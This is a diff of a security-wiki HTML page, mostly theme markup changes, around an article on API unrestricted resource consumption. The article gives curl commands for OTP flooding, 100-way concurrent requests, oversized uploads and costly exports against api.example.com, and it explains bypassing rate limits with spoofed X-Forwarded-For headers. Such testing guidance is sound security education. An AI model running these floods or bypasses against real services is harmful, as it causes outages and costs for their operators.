@@ -1,41 +1,60 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Unrestricted Resource Consumption # Unrestricted resource consumption is a vulnerability where an API allows excessive use of its resources without sufficient constraints, leading to performance degradation, service unavailability, or financial costs.
-Understanding Resource Consumption # Resources that can be exhausted:
-CPU Memory Disk Storage Database Connections Thread Pools Background Jobs Email/SMS Services Network Bandwidth Attack Surfaces # OTP / SMS endpoints Password reset functionality File upload endpoints Report generation Export (CSV/PDF) Image processing APIs GraphQL endpoints Email sending endpoints Exploitation Techniques # 1.">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="Unrestricted Resource Consumption" />
-<meta property="og:description" content="Unrestricted Resource Consumption # Unrestricted resource consumption is a vulnerability where an API allows excessive use of its resources without sufficient constraints, leading to performance degradation, service unavailability, or financial costs.
-Understanding Resource Consumption # Resources that can be exhausted:
-CPU Memory Disk Storage Database Connections Thread Pools Background Jobs Email/SMS Services Network Bandwidth Attack Surfaces # OTP / SMS endpoints Password reset functionality File upload endpoints Report generation Export (CSV/PDF) Image processing APIs GraphQL endpoints Email sending endpoints Exploitation Techniques # 1." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Unrestricted-Resource-Consumption/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
-<title>Unrestricted Resource Consumption | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Unrestricted Resource Consumption# Unrestricted resource consumption is a vulnerability where an API allows excessive use of its resources without sufficient constraints, leading to performance degradation, service unavailability, or financial costs.
+Understanding Resource Consumption# Resources that can be exhausted:
+CPU Memory Disk Storage Database Connections Thread Pools Background Jobs Email/SMS Services Network Bandwidth Attack Surfaces# OTP / SMS endpoints Password reset functionality File upload endpoints Report generation Export (CSV/PDF) Image processing APIs GraphQL endpoints Email sending endpoints Exploitation Techniques# 1. Request Flooding Attack# Attackers send a large number of requests to a resource-heavy endpoint to exhaust backend resources.
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Unrestricted-Resource-Consumption/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="Unrestricted Resource Consumption">
+	<meta property="og:description" content="Unrestricted Resource Consumption# Unrestricted resource consumption is a vulnerability where an API allows excessive use of its resources without sufficient constraints, leading to performance degradation, service unavailability, or financial costs.
+Understanding Resource Consumption# Resources that can be exhausted:
+CPU Memory Disk Storage Database Connections Thread Pools Background Jobs Email/SMS Services Network Bandwidth Attack Surfaces# OTP / SMS endpoints Password reset functionality File upload endpoints Report generation Export (CSV/PDF) Image processing APIs GraphQL endpoints Email sending endpoints Exploitation Techniques# 1. Request Flooding Attack# Attackers send a large number of requests to a resource-heavy endpoint to exhaust backend resources.">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30">
+
+
+	<meta itemprop="name" content="Unrestricted Resource Consumption">
+	<meta itemprop="description" content="Unrestricted Resource Consumption# Unrestricted resource consumption is a vulnerability where an API allows excessive use of its resources without sufficient constraints, leading to performance degradation, service unavailability, or financial costs.
+Understanding Resource Consumption# Resources that can be exhausted:
+CPU Memory Disk Storage Database Connections Thread Pools Background Jobs Email/SMS Services Network Bandwidth Attack Surfaces# OTP / SMS endpoints Password reset functionality File upload endpoints Report generation Export (CSV/PDF) Image processing APIs GraphQL endpoints Email sending endpoints Exploitation Techniques# 1. Request Flooding Attack# Attackers send a large number of requests to a resource-heavy endpoint to exhaust backend resources.">
+	<meta itemprop="dateModified" content="2026-08-05T21:53:05+05:30">
+	<meta itemprop="wordCount" content="2400">
+
+<title>Unrestricted Resource Consumption • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/Unrestricted-Resource-Consumption/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -43,11 +62,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -58,9 +81,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -75,8 +95,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -92,8 +112,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -179,8 +199,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -227,8 +247,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -982,8 +1002,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1004,8 +1024,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1026,8 +1046,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1048,8 +1068,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1070,8 +1090,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1105,8 +1125,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1127,8 +1147,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1149,8 +1169,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1171,35 +1191,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1207,30 +1205,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>Unrestricted Resource Consumption</strong>
+  <h3>Unrestricted Resource Consumption</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1288,16 +1287,10 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="unrestricted-resource-consumption">
-  Unrestricted Resource Consumption
-  <a class="anchor" href="#unrestricted-resource-consumption">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="unrestricted-resource-consumption">Unrestricted Resource Consumption<a class="anchor" href="#unrestricted-resource-consumption">#</a></h1>
 <p>Unrestricted resource consumption is a vulnerability where an API allows excessive use of its resources without sufficient constraints, leading to performance degradation, service unavailability, or financial costs.</p>
 <hr>
-<h2 id="understanding-resource-consumption">
-  Understanding Resource Consumption
-  <a class="anchor" href="#understanding-resource-consumption">#</a>
-</h2>
+<h2 id="understanding-resource-consumption">Understanding Resource Consumption<a class="anchor" href="#understanding-resource-consumption">#</a></h2>
 <p>Resources that can be exhausted:</p>
 <ul>
 <li>CPU</li>
@@ -1310,10 +1303,7 @@ https://github.com/alex-shpak/hugo-book
 <li>Network Bandwidth</li>
 </ul>
 <hr>
-<h2 id="attack-surfaces">
-  Attack Surfaces
-  <a class="anchor" href="#attack-surfaces">#</a>
-</h2>
+<h2 id="attack-surfaces">Attack Surfaces<a class="anchor" href="#attack-surfaces">#</a></h2>
 <ul>
 <li>OTP / SMS endpoints</li>
 <li>Password reset functionality</li>
@@ -1325,14 +1315,8 @@ https://github.com/alex-shpak/hugo-book
 <li>Email sending endpoints</li>
 </ul>
 <hr>
-<h2 id="exploitation-techniques">
-  Exploitation Techniques
-  <a class="anchor" href="#exploitation-techniques">#</a>
-</h2>
-<h3 id="1-request-flooding-attack">
-  1. Request Flooding Attack
-  <a class="anchor" href="#1-request-flooding-attack">#</a>
-</h3>
+<h2 id="exploitation-techniques">Exploitation Techniques<a class="anchor" href="#exploitation-techniques">#</a></h2>
+<h3 id="1-request-flooding-attack">1. Request Flooding Attack<a class="anchor" href="#1-request-flooding-attack">#</a></h3>
 <p>Attackers send a large number of requests to a resource-heavy endpoint to exhaust backend resources.</p>
 <p>This repeatedly triggers expensive operations such as:</p>
 <ul>
@@ -1342,41 +1326,27 @@ https://github.com/alex-shpak/hugo-book
 <li>export functionality</li>
 </ul>
 <p>Example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST https://api.example.com/otp/send <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{&#34;phone&#34;: &#34;+1234567890&#34;}&#39;</span> --silent
-</span></span></code></pre></div><p>Repeat this request multiple times (e.g., 1000+ requests) or automate it using Burp Intruder with zero delay.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST https://api.example.com/otp/send <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -d <span style="color:#e6db74">&#39;{&#34;phone&#34;: &#34;+1234567890&#34;}&#39;</span> --silent</span></span></code></pre></div><p>Repeat this request multiple times (e.g., 1000+ requests) or automate it using Burp Intruder with zero delay.</p>
 <hr>
-<h3 id="2-concurrent-request-attack">
-  2. Concurrent Request Attack
-  <a class="anchor" href="#2-concurrent-request-attack">#</a>
-</h3>
+<h3 id="2-concurrent-request-attack">2. Concurrent Request Attack<a class="anchor" href="#2-concurrent-request-attack">#</a></h3>
 <p>Attackers send multiple simultaneous requests to increase resource usage rapidly.</p>
 <p>Example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Send 100 concurrent OTP requests</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Send 100 concurrent OTP requests</span>
 </span></span><span style="display:flex;"><span>seq <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">100</span> | xargs -I@ -P50 curl -X POST https://api.example.com/otp/send <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{&#34;phone&#34;:&#34;+1234567890&#34;}&#39;</span> --silent
-</span></span></code></pre></div><p>This can also be automated using Burp Intruder.</p>
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -d <span style="color:#e6db74">&#39;{&#34;phone&#34;:&#34;+1234567890&#34;}&#39;</span> --silent</span></span></code></pre></div><p>This can also be automated using Burp Intruder.</p>
 <hr>
-<h3 id="3-large-file-upload-attack">
-  3. Large File Upload Attack
-  <a class="anchor" href="#3-large-file-upload-attack">#</a>
-</h3>
+<h3 id="3-large-file-upload-attack">3. Large File Upload Attack<a class="anchor" href="#3-large-file-upload-attack">#</a></h3>
 <p>Attackers upload extremely large files or multiple files to consume disk space and processing resources.</p>
 <p>Example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST https://api.example.com/upload <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -F <span style="color:#e6db74">&#34;file=@/path/to/very_large_file.zip&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;token&gt;&#34;</span>
-</span></span></code></pre></div><p>You can generate a large dummy file using:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fallocate -l 1G testfile.zip
-</span></span></code></pre></div><p>Note: <code>fallocate</code> creates a sparse file - it&rsquo;s instantly &ldquo;1GB&rdquo; in size on paper but mostly contains no real written data, so it won&rsquo;t stress disk I/O the way a genuinely dense file would. Fine for testing whether an endpoint rejects oversized uploads by size alone; if you need to test actual processing/disk-write load, generate a dense file instead:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>/dev/urandom of<span style="color:#f92672">=</span>testfile_dense.zip bs<span style="color:#f92672">=</span>1M count<span style="color:#f92672">=</span><span style="color:#ae81ff">1024</span>
-</span></span></code></pre></div><hr>
-<h3 id="4-expensive-operation-abuse">
-  4. Expensive Operation Abuse
-  <a class="anchor" href="#4-expensive-operation-abuse">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST https://api.example.com/upload <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -F <span style="color:#e6db74">&#34;file=@/path/to/very_large_file.zip&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;token&gt;&#34;</span></span></span></code></pre></div><p>You can generate a large dummy file using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fallocate -l 1G testfile.zip</span></span></code></pre></div><p>Note: <code>fallocate</code> creates a sparse file - it&rsquo;s instantly &ldquo;1GB&rdquo; in size on paper but mostly contains no real written data, so it won&rsquo;t stress disk I/O the way a genuinely dense file would. Fine for testing whether an endpoint rejects oversized uploads by size alone; if you need to test actual processing/disk-write load, generate a dense file instead:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>/dev/urandom of<span style="color:#f92672">=</span>testfile_dense.zip bs<span style="color:#f92672">=</span>1M count<span style="color:#f92672">=</span><span style="color:#ae81ff">1024</span></span></span></code></pre></div><hr>
+<h3 id="4-expensive-operation-abuse">4. Expensive Operation Abuse<a class="anchor" href="#4-expensive-operation-abuse">#</a></h3>
 <p>Attackers repeatedly trigger endpoints performing heavy backend processing.</p>
 <p>Examples:</p>
 <ul>
@@ -1385,19 +1355,15 @@ https://github.com/alex-shpak/hugo-book
 <li>analytics processing</li>
 <li>image processing</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST https://api.example.com/reports/export <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST https://api.example.com/reports/export <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -d <span style="color:#e6db74">&#39;{
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;type&#34;: &#34;csv&#34;,
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;date_range&#34;: &#34;1900-01-01:2026-01-01&#34;,
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;include_all&#34;: true
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      }&#39;</span>
-</span></span></code></pre></div><p>This can also be automated using Burp Intruder to repeatedly trigger heavy backend operations.</p>
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      }&#39;</span></span></span></code></pre></div><p>This can also be automated using Burp Intruder to repeatedly trigger heavy backend operations.</p>
 <hr>
-<h3 id="5-third-party-service-abuse">
-  5. Third-Party Service Abuse
-  <a class="anchor" href="#5-third-party-service-abuse">#</a>
-</h3>
+<h3 id="5-third-party-service-abuse">5. Third-Party Service Abuse<a class="anchor" href="#5-third-party-service-abuse">#</a></h3>
 <p>Attackers repeatedly trigger APIs connected to metered or costly services.</p>
 <p>Examples:</p>
 <ul>
@@ -1406,17 +1372,13 @@ https://github.com/alex-shpak/hugo-book
 <li>payment APIs</li>
 <li>AI generation APIs</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST https://api.example.com/auth/send-otp <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST https://api.example.com/auth/send-otp <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -d <span style="color:#e6db74">&#39;{
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;phone&#34;: &#34;+1234567890&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      }&#39;</span>
-</span></span></code></pre></div><p>Repeat this request multiple times (e.g., 1000+ requests) or automate it using Burp Intruder with zero delay.</p>
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      }&#39;</span></span></span></code></pre></div><p>Repeat this request multiple times (e.g., 1000+ requests) or automate it using Burp Intruder with zero delay.</p>
 <hr>
-<h2 id="bypassing-protections">
-  Bypassing Protections
-  <a class="anchor" href="#bypassing-protections">#</a>
-</h2>
+<h2 id="bypassing-protections">Bypassing Protections<a class="anchor" href="#bypassing-protections">#</a></h2>
 <p>Bypassing protections refers to attempts to circumvent security controls such as rate limiting, authentication checks, or input validation. Rate limiting is one such protection designed to restrict repeated requests, and weaknesses in its implementation may allow it to be bypassed using the techniques outlined below:</p>
 <ol>
 <li>
@@ -1443,8 +1405,7 @@ X-Forwared-Host: 127.0.0.1
 
 # Double X-Forwarded-For header example
 X-Forwarded-For:
-X-Forwarded-For: 127.0.0.1
-</code></pre></li>
+X-Forwarded-For: 127.0.0.1</code></pre></li>
 <li>
 <p><strong>Changing Other Headers</strong></p>
 <p>Alter request headers like <code>User-Agent</code>, <code>Cookie</code>, <code>Referer</code> to evade tracking if used to identify and track request patterns.</p>
